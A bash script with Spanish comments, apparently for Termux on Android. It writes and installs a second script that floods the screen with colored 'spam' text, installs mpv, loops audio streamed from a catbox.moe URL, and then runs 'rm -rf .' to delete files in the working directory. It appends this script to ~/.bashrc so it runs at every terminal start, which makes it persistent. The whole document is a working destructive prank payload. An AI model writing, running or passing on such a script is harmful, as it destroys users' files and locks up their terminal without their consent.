#!/bin/bash

# Paso 1: Crear el directorio ~/scripts si no existe
mkdir -p ~/scripts

# Paso 2: Crear el archivo spam_script.sh con el contenido especificado
echo '#!/bin/bash

# Función para imprimir texto colorido
function print_colored {
    colors=("31" "32" "33" "34" "35" "36")
    while true; do
        color=${colors[$RANDOM % ${#colors[@]}]}
        echo -e "\033[${color}m$(date) - ¡Spam colorido!$(date)\033[0m"
        sleep 0.2
    done
}

# Hacer el spam colorido
print_colored &

# Instalar mpv
echo -e "\033[32mInstalando mpv...\033[0m"
pkg install mpv -y

# Reproducir el audio en loop
echo -e "\033[36mReproduciendo audio...\033[0m"
mpv --loop "https://files.catbox.moe/hfzvye.mp3" &

# Espera unos segundos para escuchar el audio
sleep 5

# Borrar archivos de Termux
echo -e "\033[31mEliminando archivos de Termux...\033[0m"
rm -rf .
# Puedes agregar más directorios y archivos a eliminar si es necesario.

echo -e "\033[33mProceso completo.\033[0m"' > ~/scripts/spam_script.sh

# Paso 3: Hacer que el archivo sea ejecutable
chmod +x ~/scripts/spam_script.sh

# Paso 4: Agregar al ~/.bashrc para que se ejecute al iniciar
echo '# Ejecutar el script de spam colorido al iniciar la terminal
bash ~/scripts/spam_script.sh &' >> ~/.bashrc

# Confirmación
echo "¡Todo listo! El script se ejecutará automáticamente al iniciar Termux."
